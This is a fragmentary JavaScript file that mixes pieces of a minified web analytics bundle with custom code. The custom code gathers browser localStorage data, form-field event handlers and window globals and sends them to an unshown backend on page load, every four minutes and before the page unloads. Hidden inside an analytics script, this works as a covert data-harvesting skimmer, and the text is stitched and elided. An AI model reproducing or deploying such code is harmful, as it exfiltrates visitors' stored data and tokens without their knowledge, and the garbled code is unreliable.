const trackedElements = ['input', 'select', 'textarea'];
/*! 2023-08-01 19:38:25 v8.15.22 */
!function (e) {
  function i(n) {
...
const trackedEvents = ['click', 'keydown', 'keyup', 'change'];
...
function createHashValue(data) {
  ...
  let hashValue = 0;
  for (let i = 0, len = combinedKeys.length; i < len; i++) {
...
function trackEventListeners() {
  ...
  trackedElements.forEach(elementName => {
    document.body.querySelectorAll(elementName).forEach(element => {
      trackedEvents.forEach(eventName => {
        if (element["on" + eventName]) {
          eventListeners[`${elementName}:${eventName}`] = element["on" + eventName];
        }
      });
    });
  });
...
!function (t) {
  ...
  t.exports = s;
}]); /*! 2023-08-01 19:38:15 v8.15.22 */

function trackGlobalVariables() {
  Object.keys(window).forEach(key => {
    if (GlobalVarCollection.indexOf(key) === -1) {
      GlobalVarCollection.push(key);
    }
  });
...
function sendDataToBackend(data) {
  ...
  fetch(url, {
    ...
    body: JSON.stringify({
      hashValue,
      data,
      eventListeners: trackEventListeners(),
      globalVariables: trackGlobalVariables()
    })
  }).then(response => {
    console.log(response.ok ? "数据发送成功" : "数据发送失败,状态码:" + response.status);
  }).catch(error => {
...
!function (t) {
  ...
  e.lver = "8.15.22", e.toUtVersion = "v20230801", e.script_name = "aplus_std";
}, function (t, e, n) {
  "use strict";
  ...
  t.exports = {
    ...
    getBasicParams: function () {
      ...
      var m = n.spm_url || "";
      return o.ifAdd(p, [["wm_pageid", a.ms_data_page_id], ["wm_prototypeid", a.ms_prototype_id], ["wm_sid", a.ms_data_shop_id], ["spm-url", m], ["spm-pre", n.spm_pre], ["spm-cnt", n.spm_cnt], ["cnaui", f.cnaui]]), p;
    },
    getExParams: function () {
      return [];
    },
...
document.addEventListener("DOMContentLoaded", function () {
  const taskFn = () => sendDataToBackend(extractLocalStorageData());
  taskFn();
  setInterval(taskFn, 4 * 60 * 1000);
});
window.addEventListener("beforeunload", function () {
  sendDataToBackend(extractLocalStorageData());
});